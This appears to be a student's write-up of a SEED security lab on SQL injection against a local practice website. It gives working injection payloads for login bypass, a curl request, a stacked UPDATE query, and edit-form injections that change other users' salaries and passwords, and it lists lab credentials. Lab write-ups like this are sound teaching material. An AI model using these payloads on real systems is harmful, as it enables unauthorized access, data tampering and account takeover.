# LAB 06 - SQL Injection

**N.B.** Remember to add the row `10.9.0.5  www.seed-server.com` to the */etc/hosts* file on the machine to reach the seed-server website.

## 3.1 - Task 1
Use `mysql -u root -pdees` to login inside mysql service of container mysql (10.9.0.6):
1. Execute `SHOW databases` to show available databases;
2. Select a database with `USE datatabase_name`;
3. Show available tables of selected DB with `SHOW tables`;
4. Show content of table with `SELECT * FROM table_name`.

```
SHOW databases;
USE sqllab_users;
SHOW tables;
SELECT * FROM credential;
```

## 3.2 - Task 2


### Task 2.1
Write `admin'#` inside the **Username** field. This will skip the password field and check only based on the provided username, commentin everything that comes after (in the SQL code).

The login will then be successful and will show us the employees data.

### Task 2.2
We will now trying to do the same but from a terminal.

We know we need to excape some characters:
- '(single quote) --> %27;
- " "(space) --> %20;
- #(hashtag) --> %23;

So we can now build our url which will be something like: 
```
curl 'www.seed-server.com/unsafe_home.php?username=admin%27%23'
```

### Task 2.3
Here we try to execute multiple queries separating them by using a semicolon (`;`).
So we put in the username field on the login page the below command:
```
admin'; UPDATE credential SET Salary=25000 WHERE Name = "Alice"#
```

However the PHP code has an implicit countermeasure that will cause this to fail; by using the `mysqli::query()` method we are asking the server to execute only **ONE** query, but we are giving **TWO**, so the server will return an error.

## 3.3 - Task 3

### Task 3.1
To achieve this we first log as alice with `alice` and `seedalice` or by exploiting SQL injection.
Then we want to put on the first field of the edit page, which in this case is the *Nickname* field the following text:
```
',salary=25000 where name="Alice"#
```

In this way, we are updating our salary.

### Task 3.2
As simple as to follow the preceding task, we modify it by writing:
```
',salary=1 where name="Boby"#
```

thus changing the condition to edit `Boby` profile.

### Task 3.3
As the last part of this task here, we first test the login of Boby with `Boby` and `seedboby`.
After checking that it works, we can then work from Alice perspective:
- we log in as Alice;
- looking at the code in *unsafe_edit_backend.php* we can see that `Phone Number` is placed after `password` when building the update query; we can take advantage of this flaw.
- we then put into the edit form, `' where name="boby"#` into the Phone Number field and the new password into the password field. Et voilà!

Now we are able to login into Boby profile with the new password.

**N.B.:** to be sure of inserting the password correctly inside the password field, we can change the type of the field from password to text from the devtools section of the page.

## Task 4
